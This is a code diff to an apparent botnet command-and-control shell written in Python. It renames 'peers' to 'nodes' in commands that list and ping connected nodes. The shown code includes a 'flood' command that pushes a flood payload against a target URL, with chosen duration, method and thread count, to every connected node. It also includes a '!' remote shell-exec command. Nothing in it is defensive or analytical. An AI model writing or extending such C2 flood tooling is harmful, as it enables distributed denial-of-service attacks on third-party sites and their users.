@@ -88,43 +88,43 @@ class Commands:
         confirm = input(f"Confirm flood {url} for {duration}s with {threads} threads? (y/n) > ").strip().lower()
         if confirm in ["y", "yes"]:
             self.functions.send_flood(url, duration, method, threads)
-            print(f"Flood payload sent to all peers: {url}\nC2:payload -> Peers:payload -> Clients:exec;ack")
+            print(f"Flood payload sent to all nodes: {url}\nC2:payload -> nodes:payload -> Clients:exec;ack")
         else:
             print("Cancelled")
 
     # Ping command
     def ping(self, shell, args):
         self.functions.send_ping()
-        print("Ping sent to all peers\nC2:payload -> Peer:payload -> Clients:ack")
+        print("Ping sent to all nodes\nC2:payload -> node:payload -> Clients:ack")
 
-    # Peers command
-    def peers(self, shell, args):
+    # nodes command
+    def nodes(self, shell, args):
         if not args:
-            print("Usage: peers <list/status>")
+            print("Usage: nodes <list/status>")
             return
 
         subcmd = args[0]
 
         if subcmd == "list":
-            peers = self.c2.get_peers()
-            if not peers:
-                print("No peers connected")
+            nodes = self.c2.get_nodes()
+            if not nodes:
+                print("No nodes connected")
             else:
-                print("\nConnected peers:")
-                for peer_id, host, port in peers:
-                    print(f" ID: {peer_id}, Address: {host}:{port}")
+                print("\nConnected nodes:")
+                for node_id, host, port in nodes:
+                    print(f" ID: {node_id}, Address: {host}:{port}")
 
         elif subcmd == "status":
             self.functions.send_status()
-            peers = self.c2.get_peers()
-            if not peers:
-                print("No peers connected")
+            nodes = self.c2.get_nodes()
+            if not nodes:
+                print("No nodes connected")
             else:
-                print("\nC2:payload -> Peer:ack\nPeer status:")
-                for peer_id, host, port in peers:
-                    print(f" ID: {peer_id}, Address: {host}:{port}, Status: Connected")
+                print("\nC2:payload -> node:ack\nnode status:")
+                for node_id, host, port in nodes:
+                    print(f" ID: {node_id}, Address: {host}:{port}, Status: Connected")
         else:
-            print("Unknown subcommand for peers")
+            print("Unknown subcommand for nodes")
 
     # Show methods
     def methods(self, shell, args):
@@ -180,8 +180,8 @@ class Shell:
         self.commands["help"] = Command("help", self.commands_impl.help, 1, "help")
         self.commands["quit"] = Command("quit", self.commands_impl.quit, 3, "quit")
         self.commands["exit"] = Command("exit", self.commands_impl.quit, 3, "exit")
-        self.commands["flood"] = Command("flood", self.commands_impl.flood, 3, "flood [peer_id] <url> [duration] [method] [threads]")
-        self.commands["peers"] = Command("peers", self.commands_impl.peers, 2, "peers <list/ping/status>")
+        self.commands["flood"] = Command("flood", self.commands_impl.flood, 3, "flood [node_id] <url> [duration] [method] [threads]")
+        self.commands["nodes"] = Command("nodes", self.commands_impl.nodes, 2, "nodes <list/ping/status>")
         self.commands["methods"] = Command("methods", self.commands_impl.methods, 1, "methods")
         self.commands["ping"] = Command("ping", self.commands_impl.ping, 2, "ping")
         self.commands["!"] = Command("!", self.commands_impl.shell_exec, 1, "! <command>")
